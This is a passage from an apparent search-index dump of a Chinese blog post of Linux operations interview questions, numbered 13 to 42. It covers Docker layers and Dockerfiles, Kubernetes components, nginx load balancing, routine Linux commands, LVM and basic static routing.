","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:21:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"13. 讲一下容器的copy-on-write特性，修改容器里面的内容会修改镜像吗？ 我们知道，镜像是分层的，镜像的每一层都可以被共享，同时，镜像是只读的。当一个容器启动时，一个新的可写层被加载到镜像的顶部，这一层通常被称作“容器层”，“容器层”之下的都叫“镜像层”。 所有对容器的改动 - 无论添加、删除、还是修改文件，都只会发生在容器层中，因为只有容器层是可写的，容器层下面的所有镜像层都是只读的。镜像层数量可能会很多，所有镜像层会联合在一起组成一个统一的文件系统。如果不同层中有一个相同路径的文件，比如 /a，上层的 /a 会覆盖下层的 /a，也就是说用户只能访问到上层中的文件 /a。在容器层中，用户看到的是一个叠加之后的文件系统。 添加文件：在容器中创建文件时，新文件被添加到容器层中。 读取文件：在容器中读取某个文件时，Docker 会从上往下依次在各镜像层中查找此文件。一旦找到，立即将其复制到容器层，然后打开并读入内存。 修改文件：在容器中修改已存在的文件时，Docker 会从上往下依次在各镜像层中查找此文件。一旦找到，立即将其复制到容器层，然后修改之。 删除文件：在容器中删除文件时，Docker 也是从上往下依次在镜像层中查找此文件。找到后，会在容器层中记录下此删除操作。 只有当需要修改时才复制一份数据，这种特性被称作 Copy-on-Write。可见，容器层保存的是镜像变化的部分，不会对镜像本身进行任何修改。 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:22:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"14. 简单描述一下Dockerfile的整个构建镜像过程 首先，创建一个目录用于存放应用程序以及构建过程中使用到的各个文件等； 然后，在这个目录下创建一个Dockerfile文件，一般建议Dockerfile的文件名就是Dockerfile； 编写Dockerfile文件，编写指令，如，使用FORM指令指定基础镜像，COPY指令复制文件，RUN指令指定要运行的命令，ENV设置环境变量，EXPOSE指定容器要暴露的端口，WORKDIR设置当前工作目录，CMD容器启动时运行命令，等等指令构建镜像； Dockerfile编写完成就可以构建镜像了，使用docker build -t 镜像名:tag . 命令来构建镜像，最后一个点是表示当前目录，docker会默认寻找当前目录下的Dockerfile文件来构建镜像，如果不使用默认，可以使用-f参数来指定dockerfile文件，如：docker build -t 镜像名:tag -f /xx/xxx/Dockerfile ； 使用docker build命令构建之后，docker就会将当前目录下所有的文件发送给docker daemon，顺序执行Dockerfile文件里的指令，在这过程中会生成临时容器，在临时容器里面安装RUN指定的命令，安装成功后，docker底层会使用类似于docker commit命令来将容器保存为镜像，然后删除临时容器，以此类推，一层层的构建镜像，运行临时容器安装软件，直到最后的镜像构建成功。 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:23:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"15. Dockerfile构建镜像出现异常，如何排查？ 首先，Dockerfile是一层一层的构建镜像，期间会产生一个或多个临时容器，构建过程中其实就是在临时容器里面安装应用，如果因为临时容器安装应用出现异常导致镜像构建失败，这时容器虽然被清理掉了，但是期间构建的中间镜像还在，那么我们可以根据异常时上一层已经构建好的临时镜像，将临时镜像运行为容器，然后在容器里面运行安装命令来定位具体的异常。 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:24:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"16. Dockerfile的基本指令有哪些？ FROM：指定基础镜像（必须为第一个指令，因为需要指定使用哪个基础镜像来构建镜像）； MAINTAINER：设置镜像作者相关信息，如作者名字，日期，邮件，联系方式等； COPY：复制文件到镜像； ADD：复制文件到镜像（ADD与COPY的区别在于，ADD会自动解压tar、zip、tgz、xz等归档文件，而COPY不会，同时ADD指令还可以接一个url下载文件地址，一般建议使用- COPY：复制文件即可，文件在宿主机上是什么样子复制到镜像里面就是什么样子这样比较好）； ENV：设置环境变量； EXPOSE：暴露容器进程的端口，仅仅是提示别人容器使用的哪个端口，没有过多作用； VOLUME：数据卷持久化，挂载一个目录； WORKDIR：设置工作目录，如果目录不在，则会自动创建目录； RUN：在容器中运行命令，RUN指令会创建新的镜像层，RUN指令经常被用于安装软件包； CMD：指定容器启动时默认运行哪些命令，如果有多个CMD，则只有最后一个生效，另外，CMD指令可以被docker run之后的参数替换； ENTRYOINT：指定容器启动时运行哪些命令，如果有多个ENTRYOINT，则只有最后一个生效，另外，如果Dockerfile中同时存在CMD和ENTRYOINT，那么CMD或docker run之后的参数将被当做参数传递给ENTRYOINT； ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:25:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"17. 如何进入容器？使用哪个命令? 进入容器有两种方法：docker attach、docker exec ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:26:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"18. 什么是k8s？说出你的理解 K8s是kubernetes的简称，其本质是一个开源的容器编排系统，主要用于管理容器化的应用，其目标是让部署容器化的应用简单并且高效（powerful）,Kubernetes提供了应用部署，规划，更新，维护的一种机制。 说简单点：k8s就是一个编排容器的系统，一个可以管理容器应用全生命周期的工具，从创建应用，应用的部署，应用提供服务，扩容缩容应用，应用更新，都非常的方便，而且还可以做到故障自愈，所以，k8s是一个非常强大的容器编排系统。 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:27:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"19. k8s的组件有哪些，作用分别是什么？ k8s主要由master节点和node节点构成。master节点负责管理集群，node节点是容器应用真正运行的地方。 master节点包含的组件有：kube-api-server、kube-controller-manager、kube-scheduler、etcd。 node节点包含的组件有：kubelet、kube-proxy、container-runtime。 kube-api-server：以下简称api-server，api-server是k8s最重要的核心组件之一，它是k8s集群管理的统一访问入口，提供了RESTful API接口, 实现了认证、授权和准入控制等安全功能；api-server还是其他组件之间的数据交互和通信的枢纽，其他组件彼此之间并不会直接通信，其他组件对资源对象的增、删、改、查和监听操作都是交由api-server处理后，api-server再提交给etcd数据库做持久化存储，只有api-server才能直接操作etcd数据库，其他组件都不能直接操作etcd数据库，其他组件都是通过api-server间接的读取，写入数据到etcd。 kube-controller-manager：以下简称controller-manager，controller-manager是k8s中各种控制器的的管理者，是k8s集群内部的管理控制中心，也是k8s自动化功能的核心；controller-manager内部包含replication controller、node controller、deployment controller、endpoint controller等各种资源对象的控制器，每种控制器都负责一种特定资源的控制流程，而controller-manager正是这些controller的核心管理者。 kube-scheduler：以下简称scheduler，scheduler负责集群资源调度，其作用是将待调度的pod通过一系列复杂的调度算法计算出最合适的node节点，然后将pod绑定到目标节点上。shceduler会根据pod的信息（关注微信公众号：网络技术联盟站），全部节点信息列表，过滤掉不符合要求的节点，过滤出一批候选节点，然后给候选节点打分，选分最高的就是最佳节点，scheduler就会把目标pod安置到该节点。 Etcd：etcd是一个分布式的键值对存储数据库，主要是用于保存k8s集群状态数据，比如，pod，service等资源对象的信息；etcd可以是单个也可以有多个，多个就是etcd数据库集群，etcd通常部署奇数个实例，在大规模集群中，etcd有5个或7个节点就足够了；另外说明一点，etcd本质上可以不与master节点部署在一起，只要master节点能通过网络连接etcd数据库即可。 kubelet：每个node节点上都有一个kubelet服务进程，kubelet作为连接master和各node之间的桥梁，负责维护pod和容器的生命周期，当监听到master下发到本节点的任务时，比如创建、更新、终止pod等任务，kubelet 即通过控制docker来创建、更新、销毁容器；每个kubelet进程都会在api-server上注册本节点自身的信息，用于定期向master汇报本节点资源的使用情况。 kube-proxy：kube-proxy运行在node节点上，在Node节点上实现Pod网络代理，维护网络规则和四层负载均衡工作，kube-proxy会监听api-server中从而获取service和endpoint的变化情况，创建并维护路由规则以提供服务IP和负载均衡功能。简单理解此进程是Service的透明代理兼负载均衡器，其核心功能是将到某个Service的访问请求转发到后端的多个Pod实例上。 container-runtime：容器运行时环境，即运行容器所需要的一系列程序，目前k8s支持的容器运行时有很多，如docker、rkt或其他，比较受欢迎的是docker，但是新版的k8s已经宣布弃用docker。 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:28:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"20. kubelet的功能、作用是什么？（重点，经常会问） kubelet部署在每个node节点上的，它主要有4个功能： 节点管理：kubelet启动时会向api-server进行注册，然后会定时的向api-server汇报本节点信息状态，资源使用状态等，这样master就能够知道node节点的资源剩余，节点是否失联等等相关的信息了。master知道了整个集群所有节点的资源情况，这对于 pod 的调度和正常运行至关重要。 pod管理：kubelet负责维护node节点上pod的生命周期，当kubelet监听到master的下发到自己节点的任务时，比如要创建、更新、删除一个pod，kubelet 就会通过CRI（容器运行时接口）插件来调用不同的容器运行时来创建、更新、删除容器；常见的容器运行时有docker、containerd、rkt等等这些容器运行时，我们最熟悉的就是docker了，但在新版本的k8s已经弃用docker了，k8s1.24版本中已经使用containerd作为容器运行时了。 容器健康检查：pod中可以定义启动探针、存活探针、就绪探针等3种，我们最常用的就是存活探针、就绪探针，kubelet 会定期调用容器中的探针来检测容器是否存活，是否就绪，如果是存活探针，则会根据探测结果对检查失败的容器进行相应的重启策略； Metrics Server资源监控：在node节点上部署Metrics Server用于监控node节点、pod的CPU、内存、文件系统、网络使用等资源使用情况，而kubelet则通过Metrics Server获取所在节点及容器的上的数据。 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:29:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"21. kube-api-server的端口是多少？各个pod是如何访问kube-api-server的？ kube-api-server的端口是8080和6443，前者是http的端口，后者是https的端口，以我本机使用kubeadm安装的k8s为例： 在命名空间的kube-system命名空间里，有一个名称为kube-api-master的pod，这个pod就是运行着kube-api-server进程，它绑定了master主机的ip地址和6443端口，但是在default命名空间下，存在一个叫kubernetes的服务，该服务对外暴露端口为443，目标端口6443，这个服务的ip地址是clusterip地址池里面的第一个地址，同时这个服务的yaml定义里面并没有指定标签选择器，也就是说这个kubernetes服务所对应的endpoint是手动创建的，该endpoint也是名称叫做kubernetes，该endpoint的yaml定义里面代理到master节点的6443端口，也就是kube-api-server的IP和端口。这样一来，其他pod访问kube-api-server的整个流程就是：pod创建后嵌入了环境变量，pod获取到了kubernetes这个服务的ip和443端口，请求到kubernetes这个服务其实就是转发到了master节点上的6443端口的kube-api-server这个pod里面。 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:30:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"22. k8s中命名空间的作用是什么？ amespace是kubernetes系统中的一种非常重要的资源，namespace的主要作用是用来实现多套环境的资源隔离，或者说是多租户的资源隔离。 k8s通过将集群内部的资源分配到不同的namespace中，可以形成逻辑上的隔离，以方便不同的资源进行隔离使用和管理。不同的命名空间可以存在同名的资源，命名空间为资源提供了一个作用域。 可以通过k8s的授权机制，将不同的namespace交给不同的租户进行管理，这样就实现了多租户的资源隔离，还可以结合k8s的资源配额机制，限定不同的租户能占用的资源，例如CPU使用量、内存使用量等等来实现租户可用资源的管理。 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:31:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"23. pod资源控制器类型有哪些? Deployments：Deployment为Pod和ReplicaSet提供声明式的更新能力。 ReplicaSet：ReplicaSet的目的是维护一组在任何时候都处于运行状态的Pod副本的稳定集合。因此，它通常用来保证给定数量的、完全相同的Pod的可用性。 StatefulSets：和Deployment类似，StatefulSet管理基于相同容器规约的一组Pod。但和Deployment不同的是，StatefulSet为它们的每个Pod维护了一个有粘性的ID。这些Pod是基于相同的规约来创建的，但是不能相互替换：无论怎么调度，每个Pod都有一个永久不变的ID。 DaemonSet：DaemonSet确保全部（或者某些）节点上运行一个Pod的副本。当有节点加入集群时，也会为他们新增一个Pod。当有节点从集群移除时，这些Pod也会被回收。删除DaemonSet将会删除它创建的所有Pod。 Jobs：Job会创建一个或者多个Pod，并将继续重试Pod的执行，直到指定数量的Pod成功终止。随着Pod成功结束，Job跟踪记录成功完成的Pod个数。当数量达到指定的成功个数阈值时，任务（即Job）结束。删除Job的操作会清除所创建的全部Pod。挂起Job的操作会删除Job的所有活跃Pod，直到Job被再次恢复执行。 Automatic Clean-up for Finished Jobs：TTL-after-finished控制器提供了一种TTL机制来限制已完成执行的资源对象的生命周期。TTL控制器目前只处理Job。 CronJob：一个CronJob对象就像crontab(crontable)文件中的一行。它用Cron格式进行编写，并周期性地在给定的调度时间执行Job。 ReplicationController：ReplicationController确保在任何时候都有特定数量的Pod副本处于运行状态。换句话说，ReplicationController确保一个Pod或一组同类的Pod总是可用的。 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:32:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"24. nginx算法策略 轮询（默认） 加权轮询（轮询+weight） ip_hash 每一个请求的访问IP，都会映射成一个hash，再通过hash算法（hash值%node_count），分配到不同的后端服务器，访问ip相同的请求会固定访问同一个后端服务器，这样可以做到会话保持，解决session同步问题。 least_conn（最少连接） 使用最少连接的负载平衡，nginx将尝试不会使繁忙的应用程序服务器超载请求过多，而是将新请求分发给不太繁忙的服务器。 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:33:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"25. nignx常用模块 upstream rewrite location proxy_pass ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:34:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"26. 如何查看并且杀死僵尸进程？ top —\u003e task (line) —\u003e zombie. 把父进程杀掉，父进程死后，过继给1号进程init，init 始终负责清理僵尸进程，它产生的所有僵尸进程跟着消失；如果你使用kill ，一般都不能杀掉 defunct进程.。用了kill -15,kill -9以后 之后反而会多出更多的僵尸进程。 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:35:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"27. 搜索某个用户运行的进程 pgrep -au www ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:36:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"28. 查看某个端口正在被哪个进程使用 lsof -i :[port] ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:37:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"29. 端口转发 iptables -t nat -A PREROUTING -d 10.0.0.8 -p tcp --dport 80 -j REDIRECT --to-ports 8080 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:38:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"30 查看http的并发请求数与其TCP连接状态 netstat -n|awk '/^tcp/{++b[$NF]}END{for(a in b)print a,b[a]}' ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:39:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"31. 查看/var/log目录下文件数 ls /var/log/ -lR|grep\"^-\"|wc-l ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:40:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"32. linux系统启动流程 第一步：开机自检，加载BIOS 第二步：读取ＭＢＲ 第三步：Boot Loader　grub引导菜单 第四步：加载kernel内核 第五步：init进程依据inittab文件夹来设定运行级别 第六步：init进程执行rc.sysinit 第七步：启动内核模块 第八步：执行不同运行级别的脚本程序 第九步：执行/etc/rc.d/rc.lo ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:41:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"33. Linux文件类型 -：常规文件，即file d：目录文件 b：block device 即块设备文件，如硬盘;支持以block为单位进行随机访问 c：character device 即字符设备文件，如键盘支持以character为单位进行线性访问 l：symbolic link 即符号链接文件（关注微信公众号：网络技术联盟站），又称软链接文件 p：pipe 即命名管道文件 s：socket 即套接字文件，用于实现两个进程进行通信 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:42:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"34. 简述lvm，如何给使用lvm的/分区扩容？ 功能：可以对磁盘进行动态管理。动态按需调整大小 概念： PV 物理卷：物理卷在逻辑卷管理中处于最底层，它可以是实际物理硬盘上的分区，也可以是整个物理硬盘，也可以是raid设备。 VG 卷组：卷组建立在物理卷之上，一个卷组中至少要包括一个物理卷，在卷组建立之后可动态添加物理卷到卷组中。一个逻辑卷管理系统工程中可以只有一个卷组，也可以拥有多个卷组。 LV 逻辑卷：逻辑卷建立在卷组之上，卷组中的未分配空间可以用于建立新的逻辑卷，逻辑卷建立后可以动态地扩展和缩小空间。系统中的多个逻辑卷可以属于同一个卷组，也可以属于不同的多个卷组。 给/分区扩容步骤： 添加磁盘 使用fdisk命令对新增加的磁盘进行分区 分区完成后修改分区类型为lvm 使用pvcreate创建物理卷 使用vgextend命令将新增加的分区加入到根目录分区中 使用lvextend命令进行扩容 使用xfs_growfs调整卷分区大小 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:43:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"35. 如何在文本里面进行复制、粘贴，删除行，删除全部，按行查找和按字母查找。 以下操作全部在vi/vim命令行状态操作，不要在编辑状态操作： 在文本里 移动到想要复制的行按yy想复制到哪就移动到哪，然后按P就黏贴了 删除行 移动到改行 按dd 删除全部dG这里注意G一定要大写 按行查找 :90 这样就是找到第90行 按字母查找 /path 这样就是找到path这个单词所在的位置，文本里可能存在多个，多次查找会显示在不同的位置。 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:44:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"36. 符号链接与硬链接的区别 我们可以把符号链接，也就是软连接 当做是 windows系统里的 快捷方式。 硬链接 就好像是 又复制了一份. ln 3.txt 4.txt 这是硬链接，相当于复制，不可以跨分区，但修改3,4会跟着变，若删除3,4不受任何影响。 ln -s 3.txt 4.txt 这是软连接，相当于快捷方式。修改4,3也会跟着变，若删除3,4就坏掉了。不可以用了。 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:45:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"37. 什么是正向代理？ 一个位于客户端和原始服务器(origin server)之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。 客户端才能使用正向代理。正向代理总结就一句话：代理端代理的是客户端。例如说：我们使用的OpenVPN 等等。 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:46:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"38. 什么是反向代理？ 反向代理（Reverse Proxy）方式，是指以代理服务器来接受 Internet上的连接请求，然后将请求，发给内部网络上的服务器并将从服务器上得到的结果返回给 Internet 上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。 反向代理总结就一句话：代理端代理的是服务端 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:47:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"39. 什么是动态资源、静态资源分离？ 动态资源、静态资源分离，是让动态网站里的动态网页根据一定规则把不变的资源和经常变的资源区分开来，动静资源做好了拆分以后我们就可以根据静态资源的特点将其做缓存操作，这就是网站静态化处理的核心思路。 动态资源、静态资源分离简单的概括是：动态文件与静态文件的分离。 在我们的软件开发中，有些请求是需要后台处理的（如：.jsp,.do 等等），有些请求是不需要经过后台处理的（如：css、html、jpg、js 等等文件），这些不需要经过后台处理的文件称为静态文件，否则动态文件。 因此我们后台处理忽略静态文件。这会有人又说那我后台忽略静态文件不就完了吗？当然这是可以的，但是这样后台的请求次数就明显增多了。在我们对资源的响应速度有要求的时候，我们应该使用这种动静分离的策略去解决动、静分离将网站静态资源（HTML，JavaScript，CSS，img等文件）与后台应用分开部署，提高用户访问静态代码的速度，降低对后台应用访问 这里我们将静态资源放到 Nginx 中，动态资源转发到 Tomcat 服务器中去。 当然，因为现在七牛、阿里云等 CDN 服务已经很成熟，主流的做法，是把静态资源缓存到 CDN 服务中，从而提升访问速度。 相比本地的 Nginx 来说，CDN 服务器由于在国内有更多的节点，可以实现用户的就近访问。并且，CDN 服务可以提供更大的带宽，不像我们自己的应用服务，提供的带宽是有限的。 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:48:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"40. 网站登陆缓慢是什么原因? 网络带宽，这是一个很常见的瓶颈。 cpu、硬盘、内存配置过低，服务器负载不起来。 网站的开发代码不够完善，例如mysql语句没有进行优化，导致数据库的读写相当耗费时间。 数据库的瓶颈。当我们的数据库的数据变得越来越多的时候，那么对于数据库的读写压力肯定会变大。 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:49:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"41. a与b服务器不在同一网段怎么设置?设置完还ping不通怎么排查? AB服务器不在同一个网段 首先把不同IP段的服务器划分给不同的vlan 在通过通过三层交换机添加虚拟IP路由实在不同网段的vlan的连接 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:50:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"42. 在AB两台服务器之间通过一个服务器c做软路由使用给路由器c配置两块网卡并开启自身的路由功能 vi /etc/sysconfig/network-scripts/ifcfg-eth0 查看网卡状况ip a s eth0 A服务器设置相关网卡信息 子网掩码：255.255.255.0 IP=10.0.0.1 网关=10.0.0.254 重启网卡生效 查看路由信息 route -n 添加对应路由 route add -net 10.0.1.0/24 gw 10.0.0.1 B服务器的设置相关信息 IP=10.0.1.10 网关10.0.1.254 重启网卡生效 route -n 添加对应的路由 route add -net 10.0.0.0/24 gw 10.0.1.11 C服务器的两块网卡 网卡1 IP=10.0.0.11 网关=10.0.0.254 